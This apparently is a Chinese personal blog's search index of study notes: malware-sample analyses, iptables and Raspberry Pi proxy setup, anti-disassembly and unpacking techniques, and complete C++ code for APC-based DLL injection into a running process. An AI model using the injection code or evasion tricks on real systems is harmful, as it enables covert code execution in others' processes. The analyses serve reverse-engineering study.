0x4014c0,\n\n![](https://i.imgur.com/kijEK2T.png)\n\n发现在0x4014db处好像也是异常终止了，后改为\n\n![](https://i.imgur.com/yhPNUnh.png)\n\n正常了、\n然后在四个函数处下断点观察参数信息和返回信息，\n\n![](https://i.imgur.com/KK9LVGS.png)\n\n0x401534明显是一个解密函数，然后把网址和文件就解密出来，然后URLDownloadToFileA下载，winexec 执行下载的文件。","tags":["逆向"],"categories":["逆向"]},{"title":"iptables 基础","url":"/2017/10/20/系统基础/iptables/","content":"\n## 简介\n&emsp;&emsp;当主机收到一个数据包后，数据包先在内核空间中处理，若发现目的地址是自身，则传到用户空间中交给对应的应用程序处理，若发现目的不是自身，则会将包丢弃或进行转发。\n\n&emsp;&emsp;iptables实现防火墙功能的原理是：在数据包经过内核的过程中有五处关键地方，分别是PREROUTING、INPUT、OUTPUT、FORWARD、POSTROUTING，称为钩子函数，iptables这款用户空间的软件可以在这5处地方写规则，对经过的数据包进行处理，规则一般的定义为“如果数据包头符合这样的条件，就这样处理数据包”。\n\n&emsp;&emsp;iptables中定义有表，分别表示提供的功能，有filter表（实现包过滤）、nat表（实现网络地址转换）、mangle表（实现包修改）、raw表（实现数据跟踪），这些表具有一定的优先级：raw-->mangle-->nat-->filter\n\n![](https://i.imgur.com/Fl0nfg8.png)\n\n![](https://i.imgur.com/OHQyUMC.png)\n\n## 常用操作\n\n&emsp常用操作命令\t说明\n\n-A\t在指定链尾部添加规则\n\n-D\t删除匹配的规则\n\n-R\t替换匹配的规则\n\n-I\t在指定位置插入规则\n\n\t例：iptables -I INPUT 1 --dport 80 -j ACCEPT\n\t（将规则插入到filter表INPUT链中的第一位上）\n\n-L/S\t列出指定链或所有链的规则\n\n-F\t删除指定链或所有链的规则\n\n-N\t创建用户自定义链\n\n\t例：iptables -N allowed\n\n-X\t删除指定的用户自定义链\n\n-P\t为指定链设置默认规则策略，对自定义链不起作用\n\n\t例：iptables -P OUTPUT DROP\n\n-Z\t将指定链或所有链的计数器清零\n\n-E\t更改自定义链的名称\n\n\t例：iptables -E allowed disallowed\n\n-n\tip地址和端口号以数字方式显示\n\n\t例：iptables -Ln\n\n常见规则匹配器\t说明\n\n-p tcp|udp|icmp|all\t匹配协议，all会匹配所有协议\n\n-s addr[/mask]\t匹配源地址\n\n-d addr[/mask]\t匹配目标地址\n\n--sport port1[:port2]\t匹配源端口(可指定连续的端口）\n\n--dport port1[:port2]\t匹配目的端口(可指定连续的端口）\n\n-o interface\t匹配出口网卡，只适用FORWARD、POSTROUTING、OUTPUT。\n\n\t例：iptables -A FORWARD -o eth0\n\n-i interface\t匹配入口网卡，只使用PREROUTING、INPUT、FORWARD。\n\n--icmp-type \t匹配icmp类型（使用iptables -p icmp -h可查看可用的ICMP类型\n）\n\n--tcp-flags mask comp\t匹配TCP标记，mask表示检查范围，comp表示匹配mask中的哪些标记。\n\n\t例：iptables -A FORWARD -p tcp --tcp-flags ALL SYN，ACK -j ACCEPT\n\t（表示匹配SYN和ACK标记的数据包）\n\n目标动作\t说明\n\nACCEPT\t允许数据包通过\n\nDROP\t丢弃数据包\n\nREJECT\t丢弃数据包，并且将拒绝信息发送给发送方\n\nSNAT\t源地址转换（在nat表上）\n\n\t例：iptables -t nat -A POSTROUTING -d 192.168.0.102 -j SNAT --to 192.168.0.1 \n\nDNAT\t目标地址转换（在nat表上）\n\n\t例：iptables -t nat -A PREROUTING -d 202.202.202.2 -j DNAT --to-destination 192.168.0.102\n\nREDIRECT\t目标端口转换（在nat表上）\n\n\t例：iptables -t nat -D PREROUTING -p tcp --dport 8080 -i eth2.2 -j REDIRECT --to 80\n\nMARK\t将数据包打上标记\n\n\t例：iptables -t mangle -A PREROUTING -s 192.168.1.3 -j MARK --set-mark 60\n\n### 注意要点：\n\n    1、目标地址转换一般在PREROUTING链上操作\n\n    2、源地址转换一般在POSTROUTING链上操作\n\n\nstate：匹配指定的状态数据包\n\n\n参数\t说明\n\n--state value\tvalue可以为NEW、RELATED（有关联的）、ESTABLISHED、INVALID（未知连接）\n\n例子：\n\tiptables -A INPUT -m state --state NEW，ESTABLISHED -j ACCEPT\n\n## 常见iptables \n\n&emsp;&emsp;MASQUERADE：是动态分配ip时用的IP伪装：在nat表的POSTROUTING链加入一条规则:所有从ppp0口送出的包会被伪装（MASQUERADE）\n\n iptables -t nat -A POSTROUTING -o ppp0 -j MASQUERADE\n\n&emsp;&emsp;REDIRECT：重定向，这个在squid透明代理时肯定要用到它\n\n 所有从eth1进入的请求80和82端口的数据，被转发到80端口，由squid处理。\n\n iptables -t nat -A PREROUTING - -i eth1 -p tcp -m multiport --dports 80,82 -j REDIRECT --to-ports 80\n\n\n保存和恢复iptables规则\n\n使用iptables-save可以保存到特定文件中\n\n&emsp;&emsp;iptables-save >/etc/sysconfig/iptables_save\n\n使用iptables-restore可以恢复规则\n\n&emsp;&emsp;iptables-restore</etc/sysconfig/iptables_save\n","tags":["系统基础"],"categories":["系统基础"]},{"title":"双系统安装（win10+ubuntu）","url":"/2017/10/16/杂学/双系统安装/","content":"\n1.我选择的 是win10加ubuntu双系统。\n\n2.准备工作\n\n\t\t  U盘一个16g\n\t\t  win10系统\n\t\t  ubuntu系统\n\n3.备份好硬盘数据以后，空出一个分区，然后制作一个PE盘，然后进PE删除这个分区，使其处于未分配的空间状态，用于安装ubuntu ,然后安装win10，这个就不用多说了，大家都会。\n\n4.安装结束以后，用大白菜iso装机方式，把ubuntu系统直接写入U盘，然后U盘其启动即可进入装机状态。\n\n其他的跟一般装ubuntu一样，在分区那个位置，选择其他方式，选择手动分区，然后选择刚刚那个未分配空间，一般可以分4个分区。/boot 200M,swap分区视内存定,一般可以和内存一样大，然后剩下分/，15g-20g左右，剩下的可以全部给/home。引导驱动器选择/boot,然后继续安装正常方式来装就好了。\n\n4.此时两个系统都安好了，但是此时还是默认win10启动，此时最重要的来了，下载一个叫EasyBCD的软件，选择添加新条目，然后选择Linux，然后名称，驱动器选择/boot对应的就好了。此时重启你就会发现有两个候选操作系统了。\n\n![](https://i.imgur.com/prFcTXH.png)","tags":["杂学"],"categories":["杂学"]},{"title":"树莓派透明代理","url":"/2017/10/16/杂学/树莓派透明代理/","content":"\n\n1.安装vim\n\n连网之后，首先安装vim,便于后面的配置文件的编写。\n\n \tsudo apt-get install vim\n\n2.静态ip  \n\n图形界面貌似会失败，建议在配置文件里改：\n\n\tsudo vim /etc/dhcpcd.conf\n\n填写以下内容\n\n\tinterface eth0\n\t\n\tstatic ip_address=ip\n\t\n\tstatic routers=网关\n\t\n\tstatic domain_name_servers=223.5.5.5\n\n3.配置路由转发：\n\n\tsudo vim  /etc/sysctl.conf\n\n设置：\n\n\n\tnet.ipv4.ip_forward=1\n\n4.ssh开机自启动\n\n&emsp;&emsp;ssh 连接树莓派还是很放方面的，不用每次都去接键盘之类的\n但是树莓派的ssh 默认是不自启动的，在/etc/rc.local中添加\n\n\tsudo /etc/init.d/ssh start (exit 之前)\n\n5.shadowssocks 安装\n\n建议pip 安装\n\n>sudo pip install  shadowsocks \n就可以了然后就是配置文件的编写\n\n>sudo mkdir /etc/shadowsocks \nsudo touch /etc/shadowsocks/shadowsocks.json\n\n添加以下内容\n\n\t{ \n\t    \"server\":\"127.0.0.1\",\n\t    \"server_port\":ss服务器端口,\n\t    \"local_address\":\"0.0.0.0\",\n\t    \"local_port\":1080,\n\t    \"password\":\"ss密码\",\n\t    \"timeout\":600,\n\t    \"method\":\"aes-256-cfb\"\n\t}\n6.redsocks安装\n\n\tgit clone git@github.com:darkk/redsocks.git（克隆失败可以在其他地方下载后传过来） \n\t\n\tsudo apt-get install libevent-dev \n\t\n\tcd redsocks\n\t\n\tmake\n\n在redsocks 文件夹中有redsocks.conf.example\n把它复制出来，重命名为 redsocks.conf \n我习惯放在/etc目录下即/etc/redsocks.conf\n然后编辑配置文件\n\t\n\tlocal_ip =0.0.0.0 ;\n\tlocal_port = 12345; 自己定义后面iptables要用\n\tip = 127.0.0.1;\n\tport = 1080;\n\n7.kcptun 加速器的安装\n\nKcptun的作用主要是配合SS用来做加速。\n\n下载地址\n\n >https://github.com/xtaci/kcptun/releases/latest\n\n选择kcptun-linux-arm 那一个下载解压\n >tar -zxf kcptun-linux-arm*.tar.gz\n选择适合你的树莓派的二进制文件我选择的是client_linux_arm7 。\n\n创建配置文件如下：\n\n\t{\n\t  \"localaddr\": \":8888\",\n\t  \"remoteaddr\": \"服务器ip:端口\",\n\t  \"key\": \"very fast\",\n\t  \"crypt\": \"aes-128\",\n\t  \"mode\": \"fast2\",\n\t  \"mtu\": 1400,\n\t  \"sndwnd\": 256,\n\t  \"rcvwnd\": 2048,\n\t  \"datashard\": 10,\n\t  \"parityshard\": 3,\n\t  \"dscp\": 46,\n\t  \"nocomp\": false\n\t}\n\n然后把client_linux_arm7放到/usr/local/bin 里面\n运行\n> sudo client_linux_arm7 -c 配置文件\n就可以了。\n\n8.iptabels \n\n\tsudo sslocal -c /etc/shadowsocks/shadowsocks.json & > /dev/null 2>&1 \n\tsudo redsocks -c /etc/redsocks/redsocks.conf & > /dev/null 2>&1 \n\tsudo iptables -t nat -N REDSOCKS \n\tsudo iptables -t nat -A REDSOCKS -d 0.0.0.0 -j RETURN \n\tsudo iptables -t nat -A REDSOCKS -d 127.0.0.0/8 -j RETURN \n\tsudo iptables -t nat -A REDSOCKS -d 192.168.0.0/16 -j RETURN \n\tsudo iptables -t nat -A REDSOCKS -d 10.0.0.0/16 -j RETURN \n\tsudo iptables -t nat -A REDSOCKS -d 服务器IP -j RETURN \n\tsudo iptables -t nat -A REDSOCKS -p tcp -j REDIRECT --to-ports 12345 \n\tsudo iptables -t nat -A OUTPUT -p tcp -j REDSOCKS \n\tsudo iptables -t nat -A PREROUTING -i eth0 -p tcp -j REDSOCKS\n\n9.此时你把局域网其他电脑设置成它还是不能上网，因为存在dns 问题通过安装dnsmasq来解决\n\n\tsudo apt-get install dnsmasq\n\n配置文件在 /etc/dnsmasq.conf\n编辑配置文件\n取消no-resolv前面的注释\n加入 \n\n\t\tserver=202.38.93.153 \n\t\tserver=202.141.162.123\n\n保存重启dnsmasq  \n\n\t\tsudo service dnsmasq restart\n\n此时不出意外的话应该是可以把局域网内的其他主机网关s设置成 树莓派的ip ,然后实现透明上网。\n建议dns 设置成\n\n\t\tserver=202.38.93.153 \n\t\tserver=202.141.162.123\n\n10 .善后工作\n把上述的配置加入启动项\n\n\t\tsudo /etc/init.d/ssh start\n\t\tsudo client_linux_arm7 -c /home/pi/Desktop/configus.txt  & > /dev/null 2>&1\n\t\tsudo sslocal -c /etc/shadowsocks-libev/ss.conf & > /dev/null 2>&1\n\t\tsudo redsocks -c /etc/redsocks.conf & > /dev/null 2>&1\n\t\tsudo service dnsmasq restart\n附加：\n热点配置\n安装hostapd \n\n\tsudo apt-get install hostapd\n\n配置文件/etc/hostapd/hostapd.conf \n\n\t\tinterface=wlan0 \n\t\thw_mode=g \n\t\tchannel=10 \n\t\tauth_algs=1 \n\t\twpa=2 \n\t\twpa_key_mgmt=WPA-PSK \n\t\twpa_pairwise=CCMP \n\t\trsn_pairwise=CCMP \n\t\twpa_passphrase=wifi密码 \n\t\tssid=wifi名字\n\ndnsmasq 配置文件/etc/dnsmasq.conf 中修改\n\n\t\tinterface=wlan0\n\t\tdhcp-range=10.0.0.2,10.0.0.255,255.255.255.0,12h\n\n在启动项中/etc/rc.local 增加：\n\t\t\n\t\tsudo ifconfig wlan0 down \n\t\tsudo ifconfig wlan0 10.0.0.1 netmask 255.255.255.0 up \n\t\tsudo rm -rf /dev/random \n\t\tsudo ln -s /dev/urandom /dev/random \n\t\tsudo service dnsmasq restart \n\t\tsudo hostapd -B /etc/hostapd/hostapd.conf & > /dev/null 2>&1\n\t\tsudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE \n\t\tsudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT\n\n以及在/etc/iptables 中增加\n\n\t\tsudo iptables -t nat -A PREROUTING -i wlan0 -p tcp -j REDSOCKS\n\n参考网址：\nhttp://fishedee.com/%E5%90%8E%E7%AB%AF/2016/11/30/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9A%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86.html\n\nhttp://www.jianshu.com/p/05d32b4e8fc0\n\nhttp://blog.uiideas.com/2016/09/16/Kcptun%E4%BD%BF%E7%94%A8/\n\nhttps://story.tonylee.name/2016/03/31/yong-shu-mei-pai-da-zao-wu-xian-zhong-ji-ke-xue-shang-wang-lu-you-qi/\n","tags":["杂学"],"categories":["杂学"]},{"title":"对抗反汇编1","url":"/2017/10/16/逆向/对抗反汇编/","content":"\n##### 方法总结如下：\n\n##### 1、插入流氓字节，阻止真正的指令被反汇编\n\n线性反汇编和面向代码流的反汇编：\n\n线性反汇编是遍历一个代码段，一次一条指令的线性反汇编，不考虑代码流的控制指令。而面向代码流的反汇编是会检查每一条指令。然后建立反汇编的地址列表，然后这样的反汇编算法会更加先进，而不易出错。比如：\n\n\n\t\t.text:00401035                 jz      short near ptr loc_401037+1\n\t\t.text:00401037\n\t\t.text:00401037 loc_401037:                             ; CODE XREF: .text:00401035\u0018j\n\t\t.text:00401037                 call    near ptr 8B4C55C7h\n\n观察以上的汇编代码，你会发现jz跳转到了call 指令中间，这显然是不可能的，所以call指令一定是一个数据而不是代码，在此处按d键，然后再观察\n\n\n>     .text:00401035                 jz      short loc_401038\n>    .text:00401035 ; ---------------------------------------------------------------------------\n\t        .text:00401037                 db 0E8h\n\t    .text:00401038 ; ---------------------------------------------------------------------------\n\t    .text:00401038\n\t    .text:00401038 loc_401038:                             ; CODE XREF: .text:00401035\u0018j\n\t    .text:00401038                 mov     eax, [ebp+0Ch]\n\n这样显然很正确了，对于call 指令而言，如果后面四个字节跟的是地址，它对应的机器码是0xe8，此处显然是把数据0xe8当成了call指令，才会出现这样的问题。\n\n##### 2、固定条件的跳转指令\n\n\t                               xor     eax, eax\n\t.text:00401035                 jz      short loc_401038\n##### 3、函数指针问题 \n\n\t mov [ebp+var_4],offset sub_4011c0;\n\t call [ebp+var_4]\n\t可用IDA脚本语言IDC进行修正函数为AddCodeXref();\n##### 4、函数未识别的问题 \n\n可以按p键来强制把一段代码变成函数\n但是要把流氓字节nop,不然函数可能会出问题。用IDA自带的patch program来做。\n也可用脚本idapython  代码如下：\n\n\timport idaapi\n\tidaapi.CompileLine('static n_key(){ RunPythonStatement(\"nopIt()\");}')\n\tAddHotkey(\"Alt-N\",\"n_key\")\n\tdef nopIt():\n\t\tstart=ScreenEA()\n\t\tend=NextHead(start)\n\t\tfor ea in range(start,end):\n\t\t\tPatchByte(ea,0x90)\n\t\tJump(end)\n##### 5、异常触发\n\n\t  push offset sub_4014c0\n\t  push large dword ptr fs:0\n\t  mov large fs:0,esp\n\t  xor ecx,ecx\n\t  div ecx\n\n属于滥用结构化异常（SEH）来对抗反汇编，通过人为构造一些比如访问一个无效的内存区域，除0等来触发异常，\n\nSHE链是一个函数列表，处理线程的异常，列表中的函数要么处理异常，要么向下传递，如果传递到最后一个异常处理函数，就会被认为是一个不能处理的异常，弹出“an unhandled exception has occurred ”。\n\n查找SEH链，操作系统会检查FS寄存器，这个寄存器中包含一个段选择子，从概念上来讲，链表以栈的方式工作，第一个调用的是最后一个加入链表的记录。前面的例子就是把自己的异常处理加入到链表的头部，然后用除0来触发异常，进而执行自己的代码。","tags":["逆向"],"categories":["逆向"]},{"title":"恶意代码重定向","url":"/2017/10/16/逆向/恶意代码重定向/","content":"\n&emsp;1.首先用strings查看字符串，发现http://www.practicalmalwareanalysis.com/start.htm，User-Agent字样，以及C:\\autobat.exe，疑似编码用的字符串：\n\n\t/abcdefghijklmnopqrstuvwxyz0123456789:.以及CreateFile，CreateProcessA，\n\tInternetReadFile\n\tInternetCloseHandle\n\tInternetOpenUrlA\n\tInternetOpenA\n\tWININET.dll\n\tURLDownloadToCacheFileA \n&emsp;&emsp;显式调用高层API COM接口，以及Wininet 接口函数。\n![](https://i.imgur.com/qDJ4DI5.png)\n这些函数，这些都是重要信息需要关注的。\n\n&emsp;&emsp;2.IDA加载程序分析，首先是401457函数，调用了CreateFileA和ReadFile函数，具体分析发现是打开'C:\\autobat.exe',失败了调用函数，分析可知是把'http://www.practicalmalwareanalysis.com/start.htm',0写入文件C:\\autobat.exe，重命名该函数为write_url,然后再次调用401457函数，分析可得是把该网址读到缓冲区ipbuffer,命名该函数为read_url,返回值为1，然后接下来调用4011f3函数，首先是在szagent地址存放硬编码的头部信息，但是错误的多写了User-Agent：这样会导致实际得到的头部会出现User-Agent:User-Agent:的情况。然后下面是InternetOpenA和InternetOpenUrlA函数打开http://www.practicalmalwareanalysis.com/start.htm，打开成功后InternetReadFile读取页面信息， 首先搜索<no'字符串，然后调用401000函数，\n\n![](https://i.imgur.com/ht0pUfZ.png)\n\n&emsp;&emsp;进去分析发现是对<noscript标签的不规则比较，然后对判断是否后面会有http://www.practicalmalwareanalysis.com，然后找到“96”的位置结束，然后把v7地址存放的内容赋到a3地址。\n\n![](https://i.imgur.com/akX3WUw.png)\n\n&emsp;&emsp;函数401000成功返回1，然后4011f3也返回1，最后执行401684函数，函数有两个参数，一个是刚刚的a3，另一个是v6的地址。v6=1,打开401684函数进行分析，是现实strtok函数，把字符串分为两部分，分别赋给两变量，然后是个case语句，当发现首字母为d时，执行401565函数，分析401565函数，首先是401147函数初步分析发现是个解码函数，然后后面是URLDownloadToCacheFileA，CreateProcessA函数，是把下载的程序运行起来。首字母为n时，v6置1，首字母为s时，sleep特定的时间，首字母为r时，运行401651函数，进去函数进行分析，发现又是刚刚那个解码函数401147，然后再次调用write_url函数，由此可以知道应该是个url重定向。到此整个样本就已经分析结束了。","tags":["逆向"],"categories":["逆向"]},{"title":"dll注入之APC注入","url":"/2017/09/16/逆向/dll之APC注入/","content":"\nAPC注入的原理是利用当线程被唤醒时APC中的注册函数会被执行的机制，并以此去执行我们的DLL加载代码，进而完成DLL注入的目的，其具体流程如下：\n\n    1）当EXE里某个线程执行到SleepEx()或者WaitForSingleObjectEx()时，系统就会产生一个软中断（或者是Messagebox弹窗的时候不点OK的时候也能注入）。\n\n    2）当线程再次被唤醒时，此线程会首先执行APC队列中的被注册的函数。\n\n    3）利用QueueUserAPC()这个API可以在软中断时向线程的APC队列插入一个函数指针，如果我们插入的是Loadlibrary()执行函数的话，就能达到注入DLL的目的。\n程序如下:\n\n\t// TESTAPC2.cpp : 定义控制台应用程序的入口点。\n\t//\n\t\n\t#include \"stdafx.h\"\n\t#include <string>\n\t#include<windows.h>\n\t#include<shlwapi.h>\n\t#include<tlhelp32.h>\n\t#include<winternl.h>\n\t#pragma comment(lib,\"shlwapi.lib\")\n\t#pragma comment(lib,\"ntdll.lib\")\n\tusing namespace std;\n\t//根据进程名获取PID\n\tDWORD GetPidFormName(wstring wsProcessname)\n\t{\n\t\tHANDLE hSnaoshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\t\tif (hSnaoshot == INVALID_HANDLE_VALUE)\n\t\t{\n\t\t\treturn false;\n\t\t}\n\t\tPROCESSENTRY32W pe = { sizeof(pe) };\n\t\tBOOL bok;\n\t\tfor (bok = Process32FirstW(hSnaoshot, &pe); bok; bok = Process32NextW(hSnaoshot,&pe))\n\t\t{\n\t\t\twstring wsNowProcName = pe.szExeFile;\n\t\t\tif (StrStrI(wsNowProcName.c_str(), wsProcessname.c_str()) != NULL)\n\t\t\t{\n\t\t\t\tCloseHandle(hSnaoshot);\n\t\t\t\treturn pe.th32ProcessID;\n\t\t\t}\n\t\t}\n\t\tCloseHandle(hSnaoshot);\n\t\treturn 0;\n\t}\n\t//dll 文件注入到进程wsProcessname\n\tBOOL Injection_APC(const wstring &wsProcessname, const WCHAR wcCacheInDllPath[])\n\t{\n\t\tDWORD dwProcessId = GetPidFormName(wsProcessname);\n\t\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);\n\t\tif (!hProcess)\n\t\t{\n\t\t\treturn FALSE;\n\t\t}\n\t\tPVOID lpData = VirtualAllocEx(hProcess, NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\t\tDWORD dwRet;\n\t\tif (lpData)\n\t\t{\n\t\t\t//在远程进程申请空间写入待注入dll 的路径\n\t\t\tWriteProcessMemory(hProcess, lpData, (LPVOID)wcCacheInDllPath,MAX_PATH, &dwRet);\n\t\t\tCloseHandle(hProcess);\n\t\t}\n\t\t//开始注入\n\t\tTHREADENTRY32 te = { sizeof(te) };\n\t\tHANDLE handleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);//遍历系统中所有线程\n\t\tif (handleSnap == INVALID_HANDLE_VALUE)\n\t\t{\n\t\t\treturn false;\n\t\t}\n\t\tbool bstat = false;\n\t\tif (Thread32First(handleSnap, &te))\n\t\t{\n\t\t\tdo {\n\t\t\t\tif (te.th32OwnerProcessID == dwProcessId)\n\t\t\t\t{\n\t\t\t\t\tHANDLE handleThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);\n\t\t\t\t\tif (handleThread)\n\t\t\t\t\t{\n\t\t\t\t\t\tDWORD dwRet = QueueUserAPC((PAPCFUNC)LoadLibraryW, handleThread, (ULONG_PTR)lpData);\n\t\t\t\t\t}\n\t\t\t\t\tif (dwRet > 0)\n\t\t\t\t\t{\n\t\t\t\t\t\tbstat = TRUE;\n\t\t\t\t\t}\n\t\t\t\t\tCloseHandle(handleThread);\n\t\t\t\t}\n\t\t\t} while (Thread32Next(handleSnap, &te));\n\t\t\tCloseHandle(handleSnap);\n\t\t\treturn bstat;\n\t\t}\n\t\n\t\t}\n\t\tint main()\n\t\t{\n\t\t\tInjection_APC(L\"testapc.exe\", L\"testapcdll.dll\");\n\t\t\treturn 0;\n\t\t}\n\n测试exe程序：\n\n\t\t#include<windows.h>\n\t\tint main()\n\t\t{\n\t\t\tMessageBox(NULL, L\"start\", L\"tit\", MB_OK);\n\t\t\tSleepEx(1000 * 60 * 5, true);\n\t\t\tMessageBox(NULL, L\"end\", L\"tit\", MB_OK);\n\t\t\tSleep(-1);\n\t\t}\n\n\n测试dll 程序：\u000b\n\n\t#include<windows.h>\n\t#include\"dll.h\"\n\tBOOL APIENTRY DllMain(HANDLE hModule, DWORD dwReason, void* lpReserved)\n\t{\n\t\tswitch (dwReason)\n\t\t{\n\t\t\t// 动态链接库映射到某个进程的地址空间\n\t\tcase DLL_PROCESS_ATTACH:\n\t\t\tMessageBox(NULL, L\"in apc ok~\", L\"tit\", MB_OK);\n\t\t\t/**\n\t\t\t* 当DLL刚被加载时触发（LoadLibrary），此处专门用来做初始化工作，\n\t\t\t* 如果初始化失败可以返回 false 这样DLL就不会被继续加载了\n\t\t\t**/\n\t\t\tbreak;\n\t\n\t\t\t// 应用程序创建新的线程\n\t\tcase DLL_THREAD_ATTACH:\n\t\n\t\t\tbreak;\n\t\n\t\t\t// 应用程序某个线程正常终止\n\t\tcase DLL_THREAD_DETACH:\n\t\n\t\t\tbreak;\n\t\n\t\t\t// 动态链接库将被卸载\n\t\tcase DLL_PROCESS_DETACH:\n\t\t\t/**\n\t\t\t* 当DLL将要被卸载时触发（FreeLibrary）,此处专门用来做清理工作\n\t\t\t* 如关闭文件，释放内存空间等\n\t\t\t**/\n\t\t\tbreak;\n\t\t}\n\t\treturn 1;\n\t}\n\t/*\n\tvoid helloDLL(void)\n\t{\n\t//MessageBox(NULL, TEXT(\"Hello DLL~\"), TEXT(\"Title\"), MB_OK);\n\t}*/","tags":["逆向"],"categories":["逆向"]},{"title":"VS错误集","url":"/2017/09/14/编程/vs错误集/","content":"\n一 .无法解析的外部符号 _main，该符号在函数 \"int __cdecl invoke_main(void)\" (?invoke_main@@YAHXZ) 中被引用window\tF:\\c\\window\\window\\MSVCRTD.lib(exe_main.obj)\t\n\n&emsp;&emsp;原因是c语言程序找不到适当的入口程序函数\t\n般情况下，\n\n&emsp;&emsp;如果是windows程序，那么WinMain是入口函数，在VS2017中新建项目为“win32项目”\n\n&emsp;&emsp;如果是dos控制台程序，那么main是入口函数，在VS2017中新建项目为“win32控制台应用程序”而如果入口函数指定不当，很显然c语言运行时找不到配合函数，它就会报告错误。修改设置适应你的需求\n\n&emsp;&emsp;如果是windows程序：\n\n* 1.菜单中选择 工程->属性, 弹出属性窗口\n\n* 2.在左边栏中依次选择：配置属性->C/C++->预处理器,然后在右边栏的预处理器定义对应的项中删除_CONSOLE, 添加_WINDOWS.\n\n* 3.在左边栏中依次选择：配置属性->链接器->系统,然后在右边栏的SubSystem对应的项改为Windows(/SUBSYSTEM:WINDOWS)\n如果是控制台程序：\n\n* 1.菜单中选择 工程->属性, 弹出弹出属性窗口\n* 2.在左边栏中依次选择：配置属性->C/C++->预处理器,然后在右边栏的预处理器定义对应的项中删除_WINDOWS, 添加_CONSOLE.\n* 3.在左边栏中依次选择：配置属性->链接器->系统,然后在右边栏的SubSystem对应的项改为CONSOLE(/SUBSYSTEM:CONSOLE)\n\n二  vs2015丢失msvcp140.dll 无法运行程序\n\n1.可以选择静态编译\n\n![](https://i.imgur.com/hetjIa8.png)\n\n初始状态是这样的\n\n![](https://i.imgur.com/pXqN4Tq.png)\n\n2.安装vs2015运行库。\n\n","tags":["编程"],"categories":["编程"]},{"title":"sublime中文乱码处理","url":"/2017/09/13/杂学/sublime乱码处理/","content":"\n\n一、安装包管理器\n使用Ctrl+~快捷键或者通过View->Show Console菜单打开命令行，粘贴如下代码\n\n\n\timport urllib.request,os; pf = 'Package Control.sublime-package'; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); open(os.path.join(ipp, pf), 'wb').write(urllib.request.urlopen( 'http://sublime.wbond.net/' + pf.replace(' ',' ')).read())\n\n\n顺利的话，此时就可以在Preferences菜单下看到Package Settings和Package Control两个菜单了\n\n\n二、安装乱码处理插件：\n\n    调用ctrl+shift+p,输入：install package，回车，在稍后弹出的安装包框中搜索：ConvertToUTF8或者GBK Encoding Support，选择点击安装；\n","tags":["杂学"],"categories":["杂学"]},{"title":"常规脱壳","url":"/2017/08/09/逆向/常规脱壳/","content":"\n\n总结方法如下：\n\n1、单步跟（向上的跳转下一步F4）\n\n2、esp定律\n\n3、二次内存镜像\n\n4、一次到位\n\n5、模拟跟踪\n\n   > tc eip<sfx\n   > \n   > 调试 sfx  第二个\n\n6、最后一次异常\n\n7、特殊方法\n\nat GetVersion等\n\n8、注意事项\n当用OD插件脱壳后不能运行时，可以用loadpe修正镜像大小，然后再重建输入表，再看是否成功，不行的话，手动找一找IAT的起始位置和结束为止，看Import REC 的RVA和大小是否一致，如果还不行就用load pe重建PE\n\n\n9、常用语言的入口特征：\n\n\nVB：\n\t\n\t004012D4 >  68 54474000     push QQ个性网.00404754\n\t004012D9    E8 F0FFFFFF     call <jmp.&MSVBVM60.#100>\n\t004012DE    0000            add byte ptr ds:[eax],al\n\t004012E0    0000            add byte ptr ds:[eax],al\n\t004012E2    0000            add byte ptr ds:[eax],al\n\t004012E4    3000            xor byte ptr ds:[eax],al\n\t004012E6    0000            add byte ptr ds:[eax],al\n\t004012E8    48              dec eax\n\n\n\ndelphi:\n\t\n\t004A5C54 >  55              push ebp\n\t004A5C55    8BEC            mov ebp,esp\n\t004A5C57    83C4 F0         add esp,-10\n\t004A5C5A    B8 EC594A00     mov eax,openpro.004A59EC\n\nBC++:\n\n\t00401678 > /EB 10           jmp short btengine.0040168A\n\t0040167A   |66:623A         bound di,dword ptr ds:[edx]\n\t0040167D   |43              inc ebx\n\t0040167E   |2B2B            sub ebp,dword ptr ds:[ebx]\n\t00401680   |48              dec eax\n\t00401681   |4F              dec edi\n\t00401682   |4F              dec edi\n\t00401683   |4B              dec ebx\n\t00401684   |90              nop\n\t00401685  -|E9 98005400     jmp 00941722\n\t0040168A   \\A1 8B005400     mov eax,dword ptr ds:[54008B]\n\t0040168F    C1E0 02         shl eax,2\n\t00401692    A3 8F005400     mov dword ptr ds:[54008F],eax\n\t00401697    52              push edx\n\t00401698    6A 00           push 0\n\t0040169A    E8 99D01300     call <jmp.&KERNEL32.GetModuleHandleA>\n\t0040169F    8BD0            mov edx,eax\n\n\n\nVC++:\n\n\t0040A41E >  55              push ebp\n\t0040A41F    8BEC            mov ebp,esp\n\t0040A421    6A FF           push -1\n\t0040A423    68 C8CB4000     push 跑跑排行.0040CBC8\n\t0040A428    68 A4A54000     push <jmp.&MSVCRT._except_handler3>\n\t0040A42D    64:A1 00000000  mov eax,dword ptr fs:[0]\n\t0040A433    50              push eax\n\t0040A434    64:8925 0000000>mov dword ptr fs:[0],esp\n\t0040A43B    83EC 68         sub esp,68\n\t0040A43E    53              push ebx\n\t0040A43F    56              push esi\n\t0040A440    57              push edi\n\n\n\nMASM(汇编):\n\n\t004035C9 >  6A 00           push 0\n\t004035CB    E8 A20A0000     call <jmp.&kernel32.GetModuleHandleA>\n\t004035D0    A3 5B704000     mov dword ptr ds:[40705B],eax\n\t004035D5    68 80000000     push 80\n\t004035DA    68 2C754000     push 11.0040752C\n\t004035DF    FF35 5B704000   push dword ptr ds:[40705B]\n\t004035E5    E8 820A0000     call <jmp.&kernel32.GetModuleFileNameA>\n\t004035EA    E8 87070000     call 11.00403D76\n\t004035EF    6A 00           push 0\n\t004035F1    68 0B364000     push 11.0040360B\n\t004035F6    6A 00           push 0\n\t004035F8    6A 64           push 64\n\t004035FA    FF35 5B704000   push dword ptr 